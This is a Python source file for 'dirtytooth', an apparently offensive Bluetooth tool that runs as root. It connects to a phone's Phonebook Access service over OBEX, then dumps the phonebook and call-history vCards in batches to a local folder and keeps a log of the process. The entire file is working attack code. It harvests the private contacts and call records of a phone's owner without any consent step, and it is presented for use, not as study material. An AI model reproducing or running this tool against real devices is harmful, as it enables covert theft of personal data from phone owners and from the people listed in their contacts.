#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import shutil
import logging
import datetime
import subprocess
from xml.dom import minidom
from xml.etree import ElementTree
import bluetooth
from nOBEX import client, headers, responses
from utils.tasks import Task

LOG_PATH = '/var/log/dirtytooth'
START_PATH = '/usr/lib/dirtytooth/start'

CONTACT_BLOCK_SIZE = 5


def can_run_dirtytooth():
    return Task.get_instance().exist_task("dirtyagent")


def write_file(filename, card):
    with open(filename, "w") as f:
        f.write(card.decode())


def dump_xml(element, file_name):
    fd = open(file_name, 'w')
    fd.write('<?xml version="1.0"?>\n<!DOCTYPE vcard-listing SYSTEM "vcard-listing.dtd">\n')
    rough_string = ElementTree.tostring(element, 'utf-8')
    reparsed = minidom.parseString(rough_string)
    pretty_string = reparsed.toprettyxml() #.encode('utf-8')
    fd.write(pretty_string[23:])  # skip xml declaration
    fd.close()


def escape_ampersands(s):
    # Terrible hack to work around Python getting mad at things like
    # <foo goo="Moo & Roo" />
    us = str(s, encoding='utf-8')
    us2 = '&amp;'.join(us.split('&'))
    return bytes(us2, encoding='utf-8')


def connect(device_address):
    d = bluetooth.find_service(address=device_address, uuid="1130")
    if not d:
        logging.error('No Phonebook service found.')
        raise Exception('No Phonebook service found.')

    port = d[0]["port"]
    # Use the generic Client class to connect to the phone.
    c = client.Client(device_address, port)
    uuid = b'\x79\x61\x35\xf0\xf0\xc5\x11\xd8\x09\x66\x08\x00\x20\x0c\x9a\x66'
    # result = c.connect(header_list=[headers.Target(uuid)])
    try:
        c.connect(header_list=[headers.Target(uuid)])
        return c
    except:
        logging.error('Failed to connect to phone.')
        raise Exception('Failed to connect to phone.')
    # if not isinstance(result, responses.ConnectSuccess):
    #     logging.error('Failed to connect to phone.')
    #     raise Exception('Failed to connect to phone.')

    # return c


def dump_dir(c, src_path, dest_path):
    src_path = src_path.strip("/")

    # since some people may still be holding back progress with Python 2, I'll support
    # them for now and not use the Python 3 exists_ok option :(
    try:
        os.makedirs(dest_path)
    except OSError as e:
        logging.exception(e)
        pass

    # Access the list of vcards in the directory
    hdrs, cards = c.get(src_path, header_list=[headers.Type(b'x-bt/vcard-listing')])

    # Parse the XML response to the previous request.
    # Extract a list of file names in the directory
    names = []
    try:
        root = ElementTree.fromstring(cards)
    except ElementTree.ParseError:
        root = ElementTree.fromstring(escape_ampersands(cards))
    dump_xml(root, "/".join([dest_path, "listing.xml"]))
    for card in root.findall("card"):
        names.append(card.attrib["handle"])

    logging.info("The number files on {} is {}".format(dest_path, len(names)))

    c.setpath(src_path)

    # return to the root directory
    depth = len([f for f in src_path.split("/") if len(f)])
    for i in range(depth):
        c.setpath(to_parent=True)

    return names


def get_file(c, src_path, dest_path, folder_name=None, book=True):
    if book:
        mimetype = b'x-bt/phonebook'
    else:
        mimetype = b'x-bt/vcard'

    try:
        hdrs, card = c.get(src_path, header_list=[headers.Type(mimetype)])
        write_file(dest_path, card)
        logging.info('%s save!' % dest_path)
        return card
    except Exception as e:
        logging.exception('Exception in get data!: %s' % e)
        return False


def get_data(c, src_path, dest_path, data_list, min_list, max_list):
    c.setpath(src_path)
    for n in data_list[min_list:max_list]:
        filename = "/".join([dest_path, n])
        get_file(c, n, filename, folder_name=src_path, book=False)

    depth = len([f for f in src_path.split("/") if len(f)])
    for x in range(depth):
        c.setpath(to_parent=True)


def start_dirtytooth(mac_add=None, files_path='/tmp/dirtytooth'):
    logging.basicConfig(format='%(asctime)s - %(levelname)s:%(message)s',
                        datefmt='%d/%m/%Y %I:%M:%S %p',
                        filename=LOG_PATH,
                        level=logging.DEBUG)
    if can_run_dirtytooth():
        print('Getting device info: {}'.format(mac_add))
        logging.info('Getting device info: {}'.format(mac_add))

        if not os.path.isdir(files_path):
             os.mkdir(files_path)

        date = datetime.datetime.fromtimestamp(time.time()).strftime('%Y%m%d%H%M%S')

        tries = 0
        while tries < 5:
            print(f'Connection attempt {tries} tries')
            c = None
            try:
                c = connect(mac_add)
                print("Dirtytooth connected with device %s" % mac_add)

                src_path_pb = "telecom/pb"
                src_path_cch = "telecom/cch"

                dest_path_pb = "{}/{}-UTC_{}_telecom/pb".format(files_path, date, mac_add)
                dest_path_cch = "{}/{}-UTC_{}_telecom/cch".format(files_path, date, mac_add)

                list_pb = dump_dir(c, src_path_pb, dest_path_pb)
                list_cch = dump_dir(c, src_path_cch, dest_path_cch)

                print('Try getting contacts data...')

                i = 0
                j = CONTACT_BLOCK_SIZE

                while j <= max(len(list_pb), len(list_cch)) + CONTACT_BLOCK_SIZE:
                    print(".", end="", flush=True)
                    get_data(c, src_path_pb.strip("/"), dest_path_pb,
                            list_pb, i, j)
                    get_data(c, src_path_cch.strip("/"), dest_path_cch,
                            list_cch, i, j)

                    i = i + CONTACT_BLOCK_SIZE
                    j = j + CONTACT_BLOCK_SIZE
                print("")
                c.disconnect()
                return 1

            except Exception as e:
                tries = tries + 1
                if c:
                    c.disconnect()
                logging.exception('Exception in main: %s' % e)

        logging.error("dirtytooth failed!")
        return 0
    else:
        print('Process dirtyagent doesn´t exist')
        logging.warning("Process dirtyagent doesn´t exist")
        return -1


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Dirtytooth must be executed as root.")
        sys.exit(1)
    sys.exit(start_dirtytooth())